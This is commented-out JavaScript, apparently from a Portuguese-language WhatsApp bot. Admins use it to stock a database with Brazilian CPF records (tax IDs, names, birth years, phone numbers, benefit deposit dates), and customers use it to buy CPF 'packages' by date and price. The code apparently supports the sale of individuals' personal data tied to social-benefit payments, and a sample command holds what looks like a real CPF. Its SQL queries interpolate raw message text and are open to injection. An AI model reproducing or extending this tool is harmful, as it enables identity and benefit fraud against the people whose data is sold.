        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if (Mensagem_Texto.indexOf("/addcpfexrewftrasdfsfg===") > -1 && Adms.includes(Numero)) {

        //             Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
        //             msg = Mensagem_Texto.split("===")

        //             if (msg[1] === "") {
        //                 Texto = `Comando inválido`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }
        //             if (msg[2] === "") {
        //                 Texto = `Comando inválido`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }
        //             if (msg[3] === "") {
        //                 Texto = `Comando inválido`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }

        //             Array_Fila_Espera = []
        //             try {
        //                 await client.sendText(Mensagem_From, "ABASTECENDO CPF EXTRAORDINÁRIO...").then(async (result) => {

        //                     try {
        //                         Contagem_Abastecidas = 0

        //                         db = new sqlite3.Database(Diretorio_SQLITE_Principal);
        //                         db.serialize(async function () {
        //                             db.run("begin transaction");

        //                             try {

        //                                 Abastecendo = true

        //                                 Div = Mensagem_Texto.split("===")

        //                                 CPF = Div[1].toUpperCase()
        //                                 console.log(`Inserindo CPF: ${CPF}`)
        //                                 NOME = Div[2]
        //                                 ANO_NASC = Div[3]
        //                                 TIPO = Div[4].toUpperCase()
        //                                 SALDO = Div[5]
        //                                 NOME_CELULAR = Div[6]
        //                                 NUMERO_CELULAR = Div[7]
        //                                 QUATRO_DIGITOS = NUMERO_CELULAR.substr(NUMERO_CELULAR.length - 4);
        //                                 CADASTRADO = Div[8]
        //                                 DATA_MS_INSERIDO = Date.now()

        //                                 db.run(`INSERT INTO CPF (CPF,NOME,ANO_NASC,TIPO,SALDO,NOME_CELULAR,NUMERO_CELULAR,QUATRO_DIGITOS,CADASTRADO,DATA_MS_INSERIDO) VALUES ('${CPF}','${NOME}','${ANO_NASC}','${TIPO}','${SALDO}','${NOME_CELULAR}','${NUMERO_CELULAR}','${QUATRO_DIGITOS}','${CADASTRADO}','${DATA_MS_INSERIDO}') ON CONFLICT DO NOTHING`);
        //                                 Contagem_Abastecidas = parseInt(Contagem_Abastecidas) + 1

        //                             } catch (error) {
        //                                 console.log(error)

        //                                 for await (adm of Adms) {
        //                                     Texto = `*Ocorreu algum problema no abastecimento.*

        // Erro: ${error}`
        //                                     await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                                         Abastecendo = false
        //                                         return
        //                                     }).catch(async(erro) => {
        //                                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                                     });
        //                                 }
        //                                 return
        //                             }

        //                             if (Contagem_Abastecidas != 0) {
        //                                 console.log("comitando")
        //                                 db.run("commit");
        //                             }

        //                             for await (adm of Adms) {
        //                                 Texto = `*ABASTECIMENTO FINALIZADO*

        // CPF: ${CPF} Abastecido.
        // `, `${adm}@c.us`
        //                                 await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                                 }).catch(async(erro) => {
        //                                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                                 });
        //                             }
        //                             Abastecendo = false
        //                             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                         });
        //                     } catch (error) {
        //                         Texto = `Erro === ${error}`
        //                         await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                         }).catch(async(erro) => {
        //                             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                         });
        //                     }
        //                 })
        //                     .catch((error) => { console.log(debugLine("Error when sending = " + (JSON.stringify(error)))); });
        //             } catch (error) {
        //                 Texto = `Erro === ${error}`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳


        //addcpfextra===CPF===CADASTRADO===DATA
        //addcpfextra===12345678===EXTRAORDINARIO===1 ou 0===20/04 ou 30/04
        //addcpfextra===17844495715===0===04/05
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if (Mensagem_Texto.indexOf("/addcpfextra===") > -1 && Adms.includes(Numero)) {

        //             Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
        //             msg = Mensagem_Texto.split("===")

        //             if (msg[1] === "") {
        //                 Texto = `Comando inválido`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }
        //             if (msg[2] === "") {
        //                 Texto = `Comando inválido`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }
        //             if (msg[3] === "") {
        //                 Texto = `Comando inválido`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }

        //             Mensagem_Texto = Mensagem_Texto.replace(/\'/igm, "")

        //             Array_Fila_Espera = []
        //             try {
        //                 await client.sendText(Mensagem_From, "ABASTECENDO CPFs EXTRAORDINÁRIO...").then(async (result) => {

        //                     Linhas = Mensagem_Texto.split("\n")
        //                     try {
        //                         Contagem_Abastecidas = 0

        //                         db = new sqlite3.Database(Diretorio_SQLITE_Principal);
        //                         db.serialize(async function () {
        //                             db.run("begin transaction");

        //                             for (var index = 0; index < Linhas.length; index++) {
        //                                 try {

        //                                     Abastecendo = true

        //                                     Linha = Linhas[index].replace(/\/addcpfextra\=\=\=/igm, '');
        //                                     Div = Linha.split("===")

        //                                     console.log(`Inserindo: ${Div[2]}`)

        //                                     CPF = Div[0]
        //                                     TIPO = "EXTRAORDINARIO"
        //                                     CADASTRADO = Div[1]
        //                                     DATA = Div[2]
        //                                     DATA_MS_INSERIDO = Date.now()

        //                                     db.run(`INSERT INTO CPF_EXTRAORDINARIO (CPF,TIPO,CADASTRADO,DATA,DATA_MS_INSERIDO) VALUES ('${CPF}','${TIPO}','${CADASTRADO}','${DATA}','${DATA_MS_INSERIDO}') ON CONFLICT DO NOTHING`);
        //                                     Contagem_Abastecidas = parseInt(Contagem_Abastecidas) + 1
        //                                 } catch (error) {
        //                                     console.log(error)

        //                                     for await (adm of Adms) {
        //                                         Texto = `*Ocorreu algum problema no abastecimento.*

        // Já tinha abastecido ${Contagem_Abastecidas}.

        // Erro: ${error}`
        //                                         await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                                             Abastecendo = false
        //                                             return
        //                                         }).catch(async(erro) => {
        //                                             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                                         });
        //                                     }
        //                                     return
        //                                 }
        //                             }

        //                             if (Contagem_Abastecidas != 0) {
        //                                 console.log("comitando")
        //                                 db.run("commit");
        //                             }

        //                             for await (adm of Adms) {
        //                                 Texto = `*ABASTECIMENTO FINALIZADO*

        // ${Linhas.length} CPFs Extra Colocados para abastecimento.

        // ${Contagem_Abastecidas} CPFs Extra Abastecidas.
        // `, `${adm}@c.us`
        //                                 await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                                 }).catch(async(erro) => {
        //                                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                                 });
        //                             }
        //                             Abastecendo = false
        //                             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                         });
        //                     } catch (error) {
        //                         Texto = `Erro === ${error}`
        //                         await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                         }).catch(async(erro) => {
        //                             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                         });
        //                     }
        //                 })
        //                     .catch((error) => { console.log(debugLine("Error when sending = " + (JSON.stringify(error)))); });
        //             } catch (error) {
        //                 Texto = `Erro === ${error}`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳





        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("📜 CPF EXTRAORDINÁRIO") > -1) {

        //             Categorias = await DataBase_Better.prepare(`SELECT * FROM CPF_EXTRAORDINARIO WHERE TIPO = 'EXTRAORDINARIO' AND CADASTRADO = '0'`).all();
        //             if (Categorias.length === 0) {

        //                 Texto = `*INFELIZMENTE ESTAMOS SEM ESTOQUE DE EXTRAORDINARIOS SEM CADASTRADOS*`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 for await (adm of Adms) {
        //                     Texto = `⚠️ *ATENÇÃO ADM* ⚠️

        // Usuário: wa.me/${Numero}

        // Tentou efetuar a compra de CPF, mas o estoque está vazio!`
        //                     await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                     }).catch(async(erro) => {
        //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                     });
        //                 }
        //                 return
        //             }

        //             iD_Footer = Date.now()

        //             Texto = `*ESCOLHA A DATA DE DEPÓSITO DOS BENEFÍCIOS EXTRAORDINÁRIOS DISPONÍVEIS*`

        //             await client.sendListMessage(Mensagem_From, {
        //                 buttonText: 'DATAS',
        //                 description: Texto,
        //                 sections: [
        //                     {
        //                         title: "DATAS",
        //                         rows: [
        //                             {
        //                                 rowId: `${iD_Footer.toString()}|`,
        //                                 title: "Data: 20/04",
        //                                 description: " ",
        //                             },
        //                             {
        //                                 rowId: `${iD_Footer.toString()}|`,
        //                                 title: "Data: 04/05",
        //                                 description: " ",
        //                             }
        //                         ]
        //                     },
        //                 ],
        //             }).then(async (result) => {
        //                 await DataBase_Better.prepare(`UPDATE CONTATOS SET ID_BOTAO = '${iD_Footer.toString()}|0' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             })
        //                 .catch((erro) => {
        //                     console.error('Error when sending: ', erro);
        //                 })
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("Data: 20/04") > -1) {

        //             Categorias = await DataBase_Better.prepare(`SELECT * FROM CPF_EXTRAORDINARIO WHERE TIPO = 'EXTRAORDINARIO' AND CADASTRADO = '0' AND DATA = '20/04'`).all();
        //             if (Categorias.length === 0) {

        //                 Texto = `*INFELIZMENTE ESTAMOS SEM ESTOQUE DE EXTRAORDINARIOS SEM CADASTRADOS NA DATA 20/04*`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 for await (adm of Adms) {
        //                     Texto = `⚠️ *ATENÇÃO ADM* ⚠️

        // Usuário: wa.me/${Numero}

        // Tentou efetuar a compra de CPF, mas o estoque está vazio!`
        //                     await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                     }).catch(async(erro) => {
        //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                     });
        //                 }
        //                 return
        //             }

        //             Array_PACOTE = await DataBase_Better.prepare(`SELECT * FROM PACOTES_CPF_EXTRAORDINARIO WHERE TIPO = 'EXTRAORDINARIO' AND CADASTRADO = '0' AND DATA = '20/04'`).all();

        //             Array_Botoes = []
        //             for await (PACOTE of Array_PACOTE) {
        //                 //console.log(PACOTE["TIPO"])
        //                 //console.log(PACOTE["CADASTRADO"])
        //                 //console.log(PACOTE["DATA"])
        //                 //console.log(PACOTE["QUANTIDADE"])
        //                 //console.log(PACOTE["VALOR"])
        //                 try {
        //                     Array_Botoes.push({
        //                         rowId: `${iD_Footer.toString()}|`,
        //                         title: `Quantidade: ${PACOTE["QUANTIDADE"]}, CPFs ${PACOTE["TIPO"]}🔸`,
        //                         description: `DATA:${PACOTE["DATA"]} 🔸 PREÇO: R$: ${PACOTE["VALOR"]}💰 COD#01#`
        //                     })
        //                 } catch (error) {
        //                     await Menu(client, Numero, Mensagem_From)
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }
        //             }

        //             iD_Footer = Date.now()
        //             Texto = `📦 *PACOTES DE CPF* 📦

        // Clique em *OPÇÕES DE PACOTES* e escolha o pacote desejado e ao selecionar e enviar, caso você possua saldo suficiente, você estará efetuando a compra do mesmo.

        // ⚠️*MUITA ATENÇÃO AO ESCOLHER UM DOS PACOTES!*⚠️`

        //             await client.sendListMessage(Mensagem_From, {
        //                 buttonText: 'OPÇÕES DE PACOTES',
        //                 description: Texto,
        //                 sections: [
        //                     {
        //                         title: "PACOTES E TIPOS DE CPF",
        //                         rows: Array_Botoes
        //                     },
        //                 ],
        //             }).then(async (result) => {
        //                 await DataBase_Better.prepare(`UPDATE CONTATOS SET ID_BOTAO = '${iD_Footer.toString()}|liberar_esta_interacao_se_for_antiga' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.error('Error when sending: ', erro);
        //             })
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("Data: 04/05") > -1) {

        //             Categorias = await DataBase_Better.prepare(`SELECT * FROM CPF_EXTRAORDINARIO WHERE TIPO = 'EXTRAORDINARIO' AND CADASTRADO = '0' AND DATA = '04/05'`).all();
        //             if (Categorias.length === 0) {

        //                 Texto = `*INFELIZMENTE ESTAMOS SEM ESTOQUE DE EXTRAORDINARIOS SEM CADASTRADOS NA DATA 04/05*`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 for await (adm of Adms) {
        //                     Texto = `⚠️ *ATENÇÃO ADM* ⚠️

        // Usuário: wa.me/${Numero}

        // Tentou efetuar a compra de CPF, mas o estoque está vazio!`
        //                     await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                     }).catch(async(erro) => {
        //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                     });
        //                 }
        //                 return
        //             }

        //             Array_PACOTE = await DataBase_Better.prepare(`SELECT * FROM PACOTES_CPF_EXTRAORDINARIO WHERE TIPO = 'EXTRAORDINARIO' AND CADASTRADO = '0' AND DATA = '04/05'`).all();

        //             Array_Botoes = []
        //             for await (PACOTE of Array_PACOTE) {
        //                 //console.log(PACOTE["TIPO"])
        //                 //console.log(PACOTE["CADASTRADO"])
        //                 //console.log(PACOTE["DATA"])
        //                 //console.log(PACOTE["QUANTIDADE"])
        //                 //console.log(PACOTE["VALOR"])
        //                 try {
        //                     Array_Botoes.push({
        //                         rowId: `${iD_Footer.toString()}|`,
        //                         title: `Quantidade: ${PACOTE["QUANTIDADE"]}, CPFs ${PACOTE["TIPO"]}🔸`,
        //                         description: `DATA:${PACOTE["DATA"]} 🔸 PREÇO: R$: ${PACOTE["VALOR"]}💰 COD#02#`
        //                     })
        //                 } catch (error) {
        //                     await Menu(client, Numero, Mensagem_From)
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }
        //             }

        //             iD_Footer = Date.now()
        //             Texto = `📦 *PACOTES DE CPF* 📦

        // Clique em *OPÇÕES DE PACOTES* e escolha o pacote desejado e ao selecionar e enviar, caso você possua saldo suficiente, você estará efetuando a compra do mesmo.

        // ⚠️*MUITA ATENÇÃO AO ESCOLHER UM DOS PACOTES!*⚠️`

        //             await client.sendListMessage(Mensagem_From, {
        //                 buttonText: 'OPÇÕES DE PACOTES',
        //                 description: Texto,
        //                 sections: [
        //                     {
        //                         title: "PACOTES E TIPOS DE CPF",
        //                         rows: Array_Botoes
        //                     },
        //                 ],
        //             }).then(async (result) => {
        //                 await DataBase_Better.prepare(`UPDATE CONTATOS SET ID_BOTAO = '${iD_Footer.toString()}|liberar_esta_interacao_se_for_antiga' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.error('Error when sending: ', erro);
        //             })
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳









        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("📜 CPF BENEFÍCIOS") > -1) {

        //             Categorias = await DataBase_Better.prepare(`SELECT * FROM CPF_EXTRAORDINARIO`).all();
        //             if (Categorias.length === 0) {

        //                 Texto = `*INFELIZMENTE ESTAMOS SEM MATERIAL NO ESTOQUE, NOSSA EQUIPE FOI NOTIFICADA!*`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 for await (adm of Adms) {
        //                     Texto = `⚠️ *ATENÇÃO ADM* ⚠️

        // Usuário: wa.me/${Numero}

        // Tentou efetuar a compra de CPF, mas o estoque está vazio!`
        //                     await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                     }).catch(async(erro) => {
